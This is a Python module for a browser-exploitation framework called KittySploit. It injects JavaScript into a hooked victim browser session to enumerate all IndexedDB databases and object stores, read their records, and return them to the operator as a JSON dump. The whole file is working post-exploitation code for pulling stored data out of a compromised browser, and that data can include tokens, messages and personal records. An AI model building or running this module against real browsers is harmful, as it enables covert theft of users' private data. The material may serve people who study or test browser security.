from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "IndexedDB Dump",
		"description": "Extract databases, object stores and records from IndexedDB",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	max_entries = OptInteger(50, "Maximum records read per object store", False)
	max_stores = OptInteger(20, "Maximum object stores per database", False)

	def run(self):
		max_entries_val = int(self.max_entries or 50)
		max_stores_val = int(self.max_stores or 20)

		code_js = f"""
		(function() {{
			const MAX_ENTRIES = {max_entries_val};
			const MAX_STORES = {max_stores_val};

			function readStore(db, storeName) {{
				return new Promise(function(resolve) {{
					try {{
						const tx = db.transaction(storeName, 'readonly');
						const store = tx.objectStore(storeName);
						const req = store.getAll(undefined, MAX_ENTRIES);
						req.onsuccess = function() {{
							resolve({{
								name: storeName,
								count: (req.result || []).length,
								truncated: (req.result || []).length >= MAX_ENTRIES,
								records: req.result || []
							}});
						}};
						req.onerror = function() {{
							resolve({{ name: storeName, error: req.error ? req.error.message : 'read failed' }});
						}};
					}} catch (e) {{
						resolve({{ name: storeName, error: e.message }});
					}}
				}});
			}}

			function openDatabase(name, version) {{
				return new Promise(function(resolve) {{
					try {{
						const req = indexedDB.open(name);
						req.onerror = function() {{
							resolve({{ name: name, version: version, error: req.error ? req.error.message : 'open failed' }});
						}};
						req.onsuccess = function() {{
							const db = req.result;
							const stores = Array.from(db.objectStoreNames || []).slice(0, MAX_STORES);
							Promise.all(stores.map(function(s) {{ return readStore(db, s); }}))
								.then(function(storeData) {{
									db.close();
									resolve({{
										name: name,
										version: db.version,
										store_count: stores.length,
										stores: storeData
									}});
								}});
						}};
					}} catch (e) {{
						resolve({{ name: name, version: version, error: e.message }});
					}}
				}});
			}}

			return new Promise(function(resolve) {{
				if (!window.indexedDB) {{
					resolve(JSON.stringify({{ available: false, error: 'indexedDB is not available' }}));
					return;
				}}

				if (typeof indexedDB.databases !== 'function') {{
					resolve(JSON.stringify({{
						available: true,
						legacy: true,
						error: 'indexedDB.databases() is not supported in this browser',
						note: 'Only localStorage/sessionStorage dump is available on legacy engines'
					}}));
					return;
				}}

				indexedDB.databases().then(function(databases) {{
					const list = databases || [];
					if (list.length === 0) {{
						resolve(JSON.stringify({{ available: true, count: 0, databases: [] }}));
						return;
					}}
					Promise.all(list.map(function(db) {{
						return openDatabase(db.name, db.version);
					}})).then(function(results) {{
						resolve(JSON.stringify({{
							available: true,
							count: results.length,
							databases: results
						}}));
					}});
				}}).catch(function(err) {{
					resolve(JSON.stringify({{ available: false, error: err.message || String(err) }}));
				}});
			}});
		}})();
		"""

		result = self.send_js_and_wait_for_response(code_js, timeout=20.0)
		if not result:
			print_error("Failed to retrieve IndexedDB data")
			return False

		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse IndexedDB response: {exc}")
			print_debug(f"Raw response: {result}")
			return False

		if not data.get("available", False):
			print_error(data.get("error", "IndexedDB is not available"))
			if data.get("note"):
				print_info(data["note"])
			return False

		databases = data.get("databases", [])
		if not databases:
			print_warning("No IndexedDB databases found")
			return True

		print_success(f"Found {len(databases)} IndexedDB database(s)")
		print_info("=" * 80)

		total_records = 0
		for db in databases:
			name = db.get("name", "?")
			if db.get("error"):
				print_warning(f"  DB {name}: {db['error']}")
				continue
			print_info(f"  Database: {name} (v{db.get('version', '?')})")
			for store in db.get("stores", []):
				store_name = store.get("name", "?")
				if store.get("error"):
					print_warning(f"    Store {store_name}: {store['error']}")
					continue
				count = store.get("count", 0)
				total_records += count
				truncated = " (truncated)" if store.get("truncated") else ""
				print_info(f"    Store {store_name}: {count} record(s){truncated}")
				for idx, record in enumerate(store.get("records", [])[:5]):
					text = json.dumps(record, ensure_ascii=False)
					if len(text) > 120:
						text = text[:120] + "..."
					print_info(f"      [{idx}] {text}")
				if count > 5:
					print_info(f"      ... {count - 5} more record(s)")
			print_info("-" * 80)

		print_status("Full IndexedDB dump (JSON):")
		print_info(json.dumps(data, indent=2, ensure_ascii=False))
		print_success(f"IndexedDB dump complete ({total_records} record(s) sampled)")
		return True
